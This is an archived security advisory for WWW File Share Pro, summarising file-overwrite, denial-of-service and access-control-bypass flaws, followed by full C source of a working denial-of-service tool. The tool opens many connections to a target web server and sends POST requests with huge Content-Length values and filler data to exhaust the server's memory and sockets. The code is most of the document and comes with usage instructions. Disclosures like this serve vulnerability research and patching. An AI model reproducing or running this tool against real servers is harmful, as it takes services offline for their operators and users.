source: http://www.securityfocus.com/bid/9425/info

WWW File Share Pro has been reported prone to multiple remote vulnerabilities. 

The first reported issue is that a remote attacker may employ the "upload" functionality of the vulnerable software to overwrite arbitrary files that are writable by the WWW File Share Pro process.

The second issue reported, may allow a remote user to deny service to the affected software. It has been reported that if WWW File Share Pro handles a POST request that contains excessive data it will consume system resources and leave the affected system unresponsive.

The final issue that has been reported regards the access control routines used to control access to directories that are protected by WWW File Share Pro. It has been reported that a remote attacker may invoke a specially crafted HTTP request for the target protected resource and in doing so may bypass access controls.

/*

by Luigi Auriemma


    Exploit:
    - CPU up to 100%
    - CLOSE_WAIT for each connection, until cannot be allocated more sockets
    - eat all the memory the attacker wants
    - on some machines (Win for example) it "could" be a fast DoS because the
      sockets will be finished quickly
    
    Example of what happen to the system with 10 connections of 512 Kb:
    "10 --> 5242880" == webs allocates 5948 Kb of memory


This source is covered by GNU/GPL

UNIX & WIN VERSION

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close       closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif




#define VER     "0.1"
#define BUFFSZ  1024        /* 1 kylobyte, do not change it!!! */
#define PORT    80
#define POSTSZ  sizeof(BUG) + 11
#define BUG     "POST / HTTP/1.0\r\n" \
                "Content-Length: %lu\r\n" \
                "\r\n"






u_long resolv(char *host);
void std_err(void);






int main(int argc, char *argv[]) {
    u_char  *buff,
            *post;
    int     sd,
            err,
            j;
    long    divx,
            connum;
    u_short port = PORT;
    u_long  memkb,
            i,
            postlen,
            total;
    struct  sockaddr_in peer;



    setbuf(stdout, NULL);

    fputs("\n"
        "General webserver POST/Content-Length resources eater "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);


    if (argc < 4) {
        printf("\nUsage: %s <*kilobytes> <number_of_connections> <server> [port(80)]\n"
            "\n"
            "* amount of kilobytes that will be allocated by the server for each\n"
            "  connection (choose 1 kilobyte to quickly test the sockets consuption\n"
            "  and more to test the memory consumption)\n"
            "\n", argv[0]);
        exit(1);
    }


    divx = atol(argv[1]);        /* divx = number of kilobytes */
    connum = atol(argv[2]);
    memkb = divx << 10;          /* 1 memkb = 1 kilobyte, memkb contains the total mem to eat */
    if(argc > 4) port = atoi(argv[4]);


#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    peer.sin_addr.s_addr = resolv(argv[3]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    buff = malloc(BUFFSZ);
    if(!buff) std_err();
    memset(buff, 'a', BUFFSZ);


    post = malloc(POSTSZ);
    if(!post) std_err();


    postlen = snprintf(
        post,
        POSTSZ,
        BUG,
        memkb + 1);         /* +1 is needed */


    printf("\nStarting %ld connections to: %s:%hu\n\n",
        connum,
        inet_ntoa(peer.sin_addr),
        port);


    total = 0;
    for(i = 1; i <= connum; i++) {
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
        if(err < 0) std_err();

        printf("%lu ", i);

        err = send(sd, post, postlen, 0);
        if(err <= 0) break;
        fputs("--> ", stdout);


            /* 1 divx = 1024 bytes */
            /* 1024 divx = 1 memkb */

        for(j = 0; j < divx; j++) {
            err = send(sd, buff, BUFFSZ, 0);
            if(err <= 0) break;
        }

        total += memkb;
        printf("%lu\r", total);
        close(sd);
    }

    fputs("\n\nExploit terminated\n\n", stdout);

    return(0);
}







u_long resolv(char *host) {
    struct      hostent *hp;
    u_long      host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}






#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


